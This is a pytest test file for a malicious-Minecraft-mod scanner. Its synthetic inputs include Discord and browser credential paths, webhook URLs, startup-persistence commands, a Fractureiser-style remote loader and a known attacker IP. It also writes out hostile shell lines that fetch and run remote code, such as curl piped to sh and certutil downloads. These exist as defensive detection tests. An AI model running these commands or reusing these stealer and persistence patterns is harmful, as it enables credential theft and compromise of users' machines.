"""Each rule should fire on the pattern it's for and stay quiet on look-alikes from normal mods."""

import base64

import pytest

from modscan import rules
from modscan.rules import printable
from modscan.scanner import scan_bytes, verdict_for
from tests.factory import FABRIC_METADATA, ClassBuilder, clean_mod, cls, make_jar


def scan(files: dict) -> dict:
    report = scan_bytes(make_jar(files), "test.jar")
    return {f.id: f for f in report.findings} | {"_report": report}


def one_class(builder: ClassBuilder) -> dict:
    return scan({f"{builder.name}.class": builder})


def test_clean_mod_has_no_threats_and_its_metadata_is_read():
    report = scan_bytes(clean_mod(), "coolmod-1.2.0.jar")
    assert report.verdict == "no_known_threats"
    assert [f.id for f in report.findings] == ["network"]
    mod = report.mods[0]
    assert (mod.loader, mod.id, mod.name, mod.version, mod.authors) == ("Fabric", "coolmod", "Cool Mod", "1.2.0",
                                                                        ["Alex", "Sam"])
    assert report.urls == [{"url": "https://api.modrinth.com/v2/project/coolmod/version",
                            "location": "com/example/coolmod/UpdateChecker.class"}]


def test_information_stealer_pattern():
    found = one_class(cls("a/Grabber")
                      .string("\\discord\\Local Storage\\leveldb")
                      .string("\\Google\\Chrome\\User Data\\Default\\Login Data")
                      .string("https://discord.com/api/webhooks/1234567890/abcDEF")
                      .method_ref("java/net/HttpURLConnection", "getOutputStream"))
    assert {"credential_theft", "webhook_exfil", "stealer_pattern"} <= set(found)
    assert found["_report"].verdict == "likely_malicious"
    assert found["credential_theft"].evidence[0].location == "a/Grabber.class"


def test_base64_hidden_strings_are_decoded_and_checked():
    hidden = base64.b64encode(b"https://discord.com/api/webhooks/1/secret").decode()
    found = one_class(cls("a/B").string(hidden))
    assert "decoded from base64" in found["webhook_exfil"].evidence[0].text


def test_webhook_in_a_config_file():
    found = scan({"config.json": '{"hook": "https://discordapp.com/api/webhooks/9/x"}'})
    assert found["webhook_exfil"].evidence[0].location == "config.json"


def test_startup_persistence_with_program_execution():
    found = one_class(cls("x/Install")
                      .string("\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.jar")
                      .method_ref("java/lang/Runtime", "exec", "(Ljava/lang/String;)Ljava/lang/Process;"))
    assert {"persistence", "process_exec", "persistent_payload"} <= set(found)
    assert found["persistent_payload"].severity == "critical"


@pytest.mark.parametrize("text", ["schtasks /create /tn Updater /tr javaw.exe", "reg add HKCU\\Software\\Microsoft\\"
                                  "Windows\\CurrentVersion\\Run /v x", "~/Library/LaunchAgents/com.x.plist",
                                  "systemctl --user enable updater"])
def test_persistence_locations(text):
    assert "persistence" in one_class(cls("p/P").string(text))


def test_fractureiser_style_loader():
    """Fractureiser's stage 0 built a URLClassLoader for an http URL and invoked a class from it."""
    found = one_class(cls("dev/neko/nekoinjector/Loader")
                      .string("http").string("Utility")
                      .method_ref("java/net/URL", "<init>", "(Ljava/lang/String;Ljava/lang/String;ILjava/lang/String;)V")
                      .method_ref("java/net/URLClassLoader", "<init>", "([Ljava/net/URL;)V")
                      .method_ref("java/lang/reflect/Method", "invoke"))
    assert {"dynamic_code", "downloader"} <= set(found)
    assert found["_report"].verdict == "suspicious"


def test_network_and_code_loading_in_unrelated_classes_is_not_a_downloader():
    found = scan({"lib/Http.class": cls("lib/Http").method_ref("java/net/URL", "openConnection"),
                  "lib/Plugins.class": cls("lib/Plugins").method_ref("java/net/URLClassLoader", "<init>")})
    assert "dynamic_code" in found and "downloader" not in found


def test_minecraft_token_sent_to_a_raw_ip():
    found = one_class(cls("m/Token")
                      .method_ref("net/minecraft/class_320", "method_1674", "()Ljava/lang/String;")
                      .string("http://45.13.22.9:8080/upload"))
    assert {"session_token", "suspicious_host", "stealer_pattern"} <= set(found)


def test_account_switcher_reading_launcher_accounts_is_flagged_but_not_called_malware():
    found = one_class(cls("acc/Accounts").string(".minecraft/launcher_accounts.json")
                      .method_ref("java/net/URL", "openConnection"))
    assert found["launcher_accounts"].severity == "high"
    assert found["_report"].verdict == "suspicious"


def test_obfuscated_class_names():
    files = {f"{n}.class": cls(n) for n in ("a", "b", "c", "IlIlIlIl", "do", "com/real/Name")}
    found = scan(files)
    assert found["obfuscated_names"].evidence[0].text.startswith("5 of 6 classes")
    assert "obfuscated_names" not in scan({f"pkg/Class{n}.class": cls(f"pkg/Class{n}") for n in "ABCDEF"})


def test_encrypted_strings():
    builder = cls("e/Strings")
    for i in range(8):
        builder.string(f"\u0003\u0012\u0007{i}\u0001x")
    builder.string("normal text").string("another normal one")
    assert "encrypted_strings" in one_class(builder)


def test_non_english_text_is_not_mistaken_for_encryption():
    builder = cls("zh/Text")
    for phrase in ["欢迎使用这个模组", "配置文件已重新加载", "无法连接到服务器", "物品已添加到背包", "你的剑太锋利了",
                   "Привет, мир и все", "Größe ändern bitte"]:
        builder.string(phrase)
    assert "encrypted_strings" not in one_class(builder)


def test_hidden_payloads():
    found = scan({
        "assets/x/logo.png": b"MZ\x90\x00" + b"\0" * 100,
        "data/blob.bin": ClassBuilder("hidden/Stage2").build(),
        "run.bat": "@echo off",
        "natives/windows/lwjgl.dll": b"MZ\x90\x00" + b"\0" * 100,
    })
    texts = [e.text for e in found["embedded_payload"].evidence]
    assert any("logo.png is really a Windows program" in t for t in texts)
    assert any("blob.bin is really a compiled Java class" in t for t in texts)
    assert any("run.bat" in t for t in texts)
    assert not any("lwjgl.dll" in t for t in texts)
    assert "lwjgl.dll" in found["native_code"].evidence[0].text


def test_base64_encoded_program():
    payload = base64.b64encode(b"MZ" + bytes(range(256)) * 2).decode()
    assert "embedded_payload" in one_class(cls("s/Stage").string(payload))


def test_reflection_used_to_hide_runtime_exec():
    found = one_class(cls("r/Hide").string("java.lang.Runtime").string("getRuntime").string("exec")
                      .method_ref("java/lang/Class", "forName", "(Ljava/lang/String;)Ljava/lang/Class;"))
    assert found["reflection_hiding"].severity == "high"


def test_known_fractureiser_address():
    found = one_class(cls("k/K").string("http://85.217.144.130:8080/dl"))
    assert found["known_ioc"].severity == "critical"
    assert found["_report"].verdict == "likely_malicious"


def test_known_file_hash(monkeypatch):
    jar = make_jar({"x.txt": "x"})
    import hashlib
    monkeypatch.setitem(rules.known_iocs()["sha256"], hashlib.sha256(jar).hexdigest(), "test sample")
    report = scan_bytes(jar, "x.jar")
    assert report.findings[0].id == "known_ioc"


@pytest.mark.parametrize("text", ["powershell -WindowStyle Hidden -Command iex", "cmd.exe /c start payload.exe",
                                  "-EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
                                  "certutil -urlcache -f http://x/y z", "/bin/sh -c curl -s http://x | sh"])
def test_shell_commands(text):
    assert "shell_commands" in one_class(cls("sh/S").string(text))


@pytest.mark.parametrize("text", ["Illegal encoding, CT-MIME [{0}] CT-Enc [{1}] BOM [{2}]",
                                  "rundll32 url.dll,FileProtocolHandler https://example.com",
                                  "Open the command palette", "flush -c"])
def test_shell_look_alikes_are_ignored(text):
    assert "shell_commands" not in one_class(cls("sh/S").string(text))


def test_cookie_items_are_not_credential_theft():
    found = one_class(cls("food/Items").string("Cookies").string("Chocolate cookies").string("Login Screen"))
    assert "credential_theft" not in found


def test_anti_analysis_and_recon():
    found = one_class(cls("v/Vm").string("VBoxService.exe").string("x64dbg").string("https://api.ipify.org"))
    assert {"anti_analysis", "recon"} <= set(found)


def test_java_agent_and_archive_tricks():
    found = scan({"META-INF/MANIFEST.MF": "Manifest-Version: 1.0\r\nPremain-Class: a.Agent\r\n\r\n",
                  "../evil.txt": "x", "broken/Bad.class": b"\xca\xfe\xba\xbe\x00\x00\x00\x41\x00"})
    assert {"java_agent", "archive_anomaly", "malformed_classes"} <= set(found)


def test_evidence_is_capped_but_counted():
    builder = cls("many/Hooks")
    for i in range(25):
        builder.string(f"https://discord.com/api/webhooks/{i}/token")
    finding = one_class(builder)["webhook_exfil"]
    assert len(finding.evidence) == rules.MAX_EVIDENCE and finding.evidence_total == 25


def test_findings_are_sorted_by_severity():
    found = one_class(cls("s/S").string("\\Login Data").method_ref("java/net/URL", "openStream"))
    severities = [f.severity for f in found["_report"].findings]
    assert severities == sorted(severities, key=rules.SEVERITY_ORDER.index)


def test_verdict_thresholds():
    def f(severity):
        return rules.Finding("x", "x", severity, "", None, None, [], 0)

    assert verdict_for([]) == ("no_known_threats", 0)
    assert verdict_for([f("medium")]) == ("no_known_threats", 12)
    assert verdict_for([f("medium"), f("medium")]) == ("suspicious", 24)
    assert verdict_for([f("high")]) == ("suspicious", 25)
    assert verdict_for([f("high"), f("high"), f("medium")]) == ("likely_malicious", 62)
    assert verdict_for([f("critical")]) == ("likely_malicious", 40)


def test_control_characters_are_escaped_for_display():
    assert printable("evil\x1b[2Jname‮") == "evil\\u001b[2Jname\\u202e"


def test_single_class_files_can_be_scanned():
    report = scan_bytes(cls("a/Hook").string("https://discord.com/api/webhooks/1/x").build(), "Hook.class")
    assert report.file_type.startswith("Java class") and report.verdict == "suspicious"


def test_metadata_for_other_loaders():
    toml = '[[mods]]\nmodId="forgy"\ndisplayName="Forgy"\nversion="${file.jarVersion}"\nauthors="Kim, Lee"\n'
    report = scan_bytes(make_jar({"META-INF/MANIFEST.MF": "Implementation-Version: 3.1\r\n\r\n",
                                  "META-INF/neoforge.mods.toml": toml}), "f.jar")
    mod = report.mods[0]
    assert (mod.loader, mod.id, mod.version, mod.authors) == ("NeoForge", "forgy", "3.1", ["Kim", "Lee"])

    report = scan_bytes(make_jar({"plugin.yml": "name: Shopkeeper\nversion: '2.0'\nmain: a.B\nauthor: Jo\n"}), "p.jar")
    assert (report.mods[0].loader, report.mods[0].name, report.mods[0].version) == ("Bukkit/Spigot", "Shopkeeper", "2.0")

    assert scan_bytes(make_jar({"fabric.mod.json": "{not json"}), "x.jar").mods == []
    assert scan_bytes(make_jar({"fabric.mod.json": FABRIC_METADATA}), "x.jar").mods[0].name == "Cool Mod"
